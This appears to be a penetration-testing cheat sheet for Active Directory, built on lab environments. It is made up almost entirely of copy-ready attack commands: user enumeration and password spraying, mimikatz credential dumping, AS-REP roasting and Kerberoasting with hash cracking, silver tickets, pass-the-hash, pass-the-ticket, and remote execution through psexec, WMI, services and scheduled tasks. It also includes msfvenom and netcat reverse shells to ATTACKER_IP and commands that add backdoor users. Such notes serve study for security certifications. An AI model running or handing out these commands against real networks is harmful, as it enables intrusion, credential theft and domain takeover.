[Enumerating Active Directory](#enumerating-active-directory)
[Letaral Movement]


# Enumerating Active Directory

## Identifying Hosts
```bash
# wireshark
sudo -E wireshark

# tcpdump
sudo tcpdump -i ens224 

# Fping(it utilizes ICMP requests and replies to reach out and interact with a host)
fping -asgq 172.16.5.0/23
```

## Identifying Users && user/group/share enum && password policy && password spray
**kerbrute**
```bash
# useful username list
https://github.com/insidetrust/statistically-likely-usernames/blob/master/jsmith.txt

kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users

# password spraying
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```

**enum4linux**
```bash
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

**ldapsearch**
```bash
# password policy
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# userenum
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```

**windapsearch**
```bash
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U

# domain admins
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da

# Privileged Users
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
```

**crackmapexec**
```bash
# password policy
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol

# userenum
crackmapexec smb 172.16.5.5 --users

# group enum
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups

# loggedon users
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users

# password spray
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 --continue-on-success
```

**netexec**
```bash
# if user exists, it will say "KDC_ERR_PREAUTH_FAILED"
# if user doesn't exist, it will say "KDC_ERR_C_PRINCIPAL_UNKNOWN"
netexec smb 10.10.x.x -k -u 'guest' -p ''

# see if we can get users information through guest account(guest account has blank password)
netexec smb 10.10.x.x -u 'guest' -p '' --users

# we're using rid to find valid usernames
netexec smb 10.10.x.x -u 'guest' -p '' --rid-brute 6000

# use username as password
# --no-bruteforce will just read the file sequentially
netexec smb 10.x.x.x -u users.txt -p users.txt --no-bruteforce --continue-on-success

netexec smb 10.x.x.x -u 'operator' -p 'operator' --shares
```

**rpcclient**
```bash
# password policy
rpcclient -U "" -N 172.16.5.5
rpcclient $> getdompwinfo


# first login as some guest user
rpcclient 10.10.x.x -U guest
> enumdomusers

# when enumdomusers don't work and lookupnames work...
> lookupnames administrator
> get the sid and change the user side at the very last part(500)
> user's sid start from 1000 so we can start enumerating from there
> lookupsids S-1-5-21-4078382237-1492182817-2568127209-1000

# if lookupnames doesn't work
> queryuser 0x1F4
(change decimal number 500 to hex number)

for i in $(seq 500 4000);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done

# man page
man rpcclient
```

**net**
```bash
# password policy
net accounts

# enumerate share
net use \\DC01\ipc$ "" /u:""
net use \\DC01\ipc$ "" /u:guest
net use \\DC01\ipc$ "password" /u:guest

# user, group enumeration
net user /domain
net user jeffadmin /domain
net group /domain
net group "Management Department" /domain

# add stephanie to management department
net group "Management Department" stephanie /add /domain
net group "Management Department" stephanie /del /domain
```

**smbmap**
```bash
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```

**enum4linux-ng**
```bash
enum4linux-ng -P 172.16.5.5 -oA ilfreight
```

**command injection**
```bash
runas.exe /netonly /user:<domain>\<username> cmd.exe
```

**ActiveDirectory PowerShell Module**
```bash
# check if the module is imported
Get-Module

# import the module
Import-Module ActiveDirectory
Get-Module

# get addomain
Get-ADDomain

# Get-ADUser
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# trust
Get-ADTrust -Filter *

# group
Get-ADGroup -Filter * | select name
Get-ADGroup -Identity "Backup Operators"

# group membership
Get-ADGroupMember -Identity "Backup Operators"
```


**PowerView**
```bash
# password policy
import-module .\PowerView.ps1
Get-DomainPolicy

# basic information about the domain
Get-Domain
Get-NetDomain

# domain user objects
Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
Get-NetUser
Get-NetUser | select cn

# recursive group membership
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# trust enumeration
Get-DomainTrustMapping

# domain group
Get-NetGroup | select cn
Get-NetGroup "Sales Department" | select member

# Testing for Local Admin Access
Test-AdminAccess -ComputerName ACADEMY-EA-MS01

# Finding Users With SPN Set
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName

# domain computer
Get-DomainComputer | select operatingsystem
Get-NetComputer
Get-NetComputer | select operatingsystem,dnshostname

# fine possible local administrative access on computers
Find-LocalAdminAccess

# enumerate spn
Get-NetUser -SPN | select samaccountname,serviceprincipalname

# enumerate ACL: which SecurityIdentifier has which ActiveDirectoryRights
Get-ObjectAcl -Identity stephanie
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights

# convert sid to name
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104

# enumerate domain share: check SYSVOL to see if there's any policy "....xml"
Find-DomainShare
```

**PsLoggedon.exe**
```bash
.\PsLoggedon.exe \\web04
```

**setspn**
```bash
# enumerate spns
setspn.exe -Q */*

setspn -L iis_service
```

**Bloodhound**
```bash
Import-Module .\Sharphound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\TEMP\
```

**Sharphound.exe**
```bash
.\SharpHound.exe -c All --zipfilename ILFREIGHT
```

# Lateral Movement

**Cached credentials**
```bash
# mimikatz
privilege::debug
sekurlsa::logonpasswords

sekurlsa::tickets
```

**Password attacks**
```bash
# account policy
net accounts

# crackmapexec
crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success

# kerbrute
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
```

**AS-REP roasting**
```bash
# impacket-GetNPUser
impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete

# rubeus
.\Rubeus.exe asreproast /nowrap

# crack hash
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

## Kerberoasting
### Manual way
```bash
#Enumerating SPNs with setspn.exe
setspn.exe -Q */*

# Targeting a Single User
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433" 

#Retrieving All Tickets Using setspn.exe
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

### Powerview
```bash
# enumerate spns
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname

# target a specific user
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation

```

### Rubeus
```bash
# rebeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
.\Rubeus.exe kerberoast /user:testspn /nowrap
```

### impacket-GetUserSPNs
```bash
# impacket-GetUserSPNs
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete

# crack hash
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

## Silver ticket
![image](https://github.com/nuricheun/OSCP/assets/14031269/f699a792-5dbe-4804-bf52-977e0fee4888)
![image](https://github.com/nuricheun/OSCP/assets/14031269/fd16d1df-f248-4256-9b33-2230470bcea4)
```bash
#Get domain SID
whoami /user
#IIS service ntlm from mimikatz or somewhere
#mimikatz silver ticket attack
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
iwr -UseDefaultCredentials http://web04

# on kali machine
ticketer.py -spn SPN -domain-sid DOMAIN SID -nthash NTLM -dc-ip IP_VICTIM -domain domain Administrator
```


**PSEXEC**
```bash
psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe

psexec.py <% tp.frontmatter["DOMAIN"] %>/<% tp.frontmatter["USERNAME"] %>:'<% tp.frontmatter["PASSWORD"] %>'@<% tp.frontmatter["RHOST"] %>
psexec.py -hashes  ntlm:ntlm <% tp.frontmatter["USERNAME"] %>@<% tp.frontmatter["RHOST"] %>
```

**wmiexec**
```bash
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5

```

**WinRM**
```bash
winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
```

**WinRM with powershell**
```bash
# create a PSCredential object:
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;

# create an interactive session:
Enter-PSSession -Computername TARGET -Credential $credential
```

**Creating Services Using sc**
```bash
# Simply create a new user
sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
sc.exe \\TARGET start THMservice

# Upload a service binary
## Create and upload service-binary
msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=ATTACKER_IP LPORT=4444 -o mightyllamaservice.exe
smbclient -c 'put mightyllamaservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever

## Fire up multi/handler
user@AttackBox$ msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set LHOST lateralmovement
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > set payload windows/shell/reverse_tcp
msf6 exploit(multi/handler) > exploit 

## Since current user cannot execute sc.exe, we should spawn a shell as lenoard.summers
runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443"

## Create and start a service
sc.exe \\thmiis.za.tryhackme.com create LAMMYservice-3333 binPath= "%windir%\mightyllamaservice.exe" start=auto
sc.exe \\thmiis.za.tryhackme.com start LAMMYservice-3333
```

**Creating Services Using scheduled tasks**
```bash
schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 
schtasks /s TARGET /run /TN "THMtask1" 
```

**WMI**
**First we need to create PSCredentials object && Establish WMI session**

```bash
# First we need to create PSCredentials object
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;

# Establish WMI session
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

**ATTACK TYPE 1. Create Remote Process**
```bash
# Create Remote Process
$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $Command}

# Same can be done with wmic.exe(legacy)
wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create "cmd.exe /c calc.exe"
```

**ATTACK TYPE 2. Create Service**
```bash
# Create Service
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
Name = "THMService2";
DisplayName = "THMService2";
PathName = "net user munra2 Pass123 /add"; # Your payload
ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
StartMode = "Manual"
}

# Run the service
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'"
Invoke-CimMethod -InputObject $Service -MethodName StartService

# Stop and delete the service
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete
```


**ATTACK TYPE 3. Create Scheduled Tasks**
```bash
# Payload must be split in Command and Args
$Command = "cmd.exe"
$Args = "/c net user munra22 aSdf1234 /add"

$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"
Start-ScheduledTask -CimSession $Session -TaskName "THMtask2"

# Delete scheduled tasks
Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```

**Installing MSI packages**
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=lateralmovement LPORT=4445 -f msi > myinstaller.msi
smbclient -c 'put myinstaller.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994

# Start a WMI session
PS C:\> $username = 't1_corine.waters';
PS C:\> $password = 'Korine.1994';
PS C:\> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
PS C:\> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
PS C:\> $Opt = New-CimSessionOption -Protocol DCOM
PS C:\> $Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop

# Invoke the install method
PS C:\> Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
```

**Pass the Hash**
```bash
# Extracting NTLM hashes from local SAM: only local users
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::sam

# Extracting NTLM hashes from LSASS memory: local users, recently logged on domain users
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # sekurlsa::msv

# PtH attack
mimikatz # token::revert
mimikatz # sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"
```

**Pass the Ticket**
```bash
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi
```
